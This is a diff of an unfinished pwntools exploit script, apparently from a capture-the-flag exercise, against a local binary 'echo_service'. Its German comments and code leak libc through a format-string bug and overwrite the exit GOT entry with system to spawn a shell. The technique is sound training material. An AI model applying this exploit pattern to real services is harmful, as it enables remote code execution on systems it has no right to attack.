@@ -3,13 +3,23 @@
 from pwn import *
 
 exe = context.binary = ELF("./echo_service", checksec=False)
+libc = exe.libc
 context.log_level = "error"
 
-# Format String Override auf Stack (200 Size hab ich, 4 ist die Variable selbst)
-# Idee: Got overflow auf exit 
-# ==> adresse von system bei got in exit überschreiben
-# + es müsste bin/sh auf dem Stack liegen für echo_service (adresse davon)
-# 
+# Format String Vuln. 
+# Idee:
+# - got Override von puts (oder exit)
+# ==> brauche file offset ==> brauche Leak von einer Adresse in dem selben Segment (z.B. main/start)
+# damit weiß ich wo ich was schreiben muss (Adresse von puts@got)
+# Was schreiben?
+# - system mit bin/sh
+# ==> brauche auch libc base (krieg ich durch io geschenkt!)
+
+# Angriffs Plan:
+# Leak exe base mit %p
+# Finde selbst Referenz im Stack für Write where what (19 via gdb)
+# ==> im Format string muss die Adresse von puts@got stehen und hinten die Adresse von system
+# Außerdem muss auf dem Stack die Adresse von /bin/sh stehen (32 Bit ==> direkt beim Format String)
 
 def start(argv=[], *a, **kw):
     gdbscript = """
@@ -28,58 +38,51 @@ def start(argv=[], *a, **kw):
     else:
         return process([exe.path] + argv, *a, **kw)
 
-# you can also create new functions here
+def leakLibCBaes(io):
+    io.recvuntil(b">>")
+    io.sendline(b"1")
+    io.recvuntil(b">")
 
-def writeBinSh(io, binsh, ):
-    exploit = b""
-    exploit += b"%1$p"
+    payload = b"%83$p"
     
-    io.recvuntil(b">>")
-    io.sendline(b"1")
-    io.recvuntil(b">")
-    io.sendline(exploit)
-    addr = io.recvuntil(b">>")[1:11]
-    addr = int(addr, 16) - 76
+    io.sendline(payload)
+    addr = io.recvuntil(b">>")[0:11]
 
-    exploit = b""
-    exploit += p32(addr)
-    exploit += b"%19$123456x"
-    exploit += b"%19$n" 
+    libc.address = int(addr, 16) - libc.sym["__libc_start_call_main"] - 121
 
-    io.sendline(b"1")
-    io.recvuntil(b"\n")
-    io.sendline(exploit)
-
-def gotExitOverwriteWithSystem(io, exit, system):
-    exploit = b""
-    exploit += p32(exit)
-    exploit += p32(exit + 2)
-    exploit += b"%19$17048x"
-    exploit += b"%19$n" # 
-    exploit += b"%20$46398x"
-    exploit += b"%20$n"
-
-    io.recvuntil(b">>")
-    io.sendline(b"1")
-    io.recvuntil(b">")
-    io.sendline(exploit)
 
 def main():
     io = start()
 
     # add your exploit code here
-    libc = ELF(exe.libc.path, checksec=False) # Load libc
-    exit = exe.got["exit"] # Got Entry of Exit (will be overwritten by loader with actual addr from libc)
-    system = libc.sym["system"] # What we actually want to write there 
-    binsh = next(libc.search(b'/bin/sh')) # we also need a parameter to start a shell
 
-    gotExitOverwriteWithSystem(io, exit, system)
+    leakLibCBaes(io)
 
-    #writeBinSh(io, binsh)
+    payload = b""
 
+    payload += p32(exe.got.exit)
+    payload += (p32(exe.got.exit + 2))
+    system = libc.sym.system
+
+
+    io.sendline(b"1")
+    io.recvuntil(b">")
+
+    payload += b"%1$" +  b"x"
+    payload += b"%19$hn"
+
+    payload += b"%1$" + b"x"
+    payload += b"%20$hn"
+
+
+    io.sendline(payload)
+    #print(payload)
+    io.recvuntil(b">>")
     io.interactive()
-    #io.recvuntil(b">>")
     #io.sendline(b"2")
+
+    print(hex(system))
+    
 
 
 
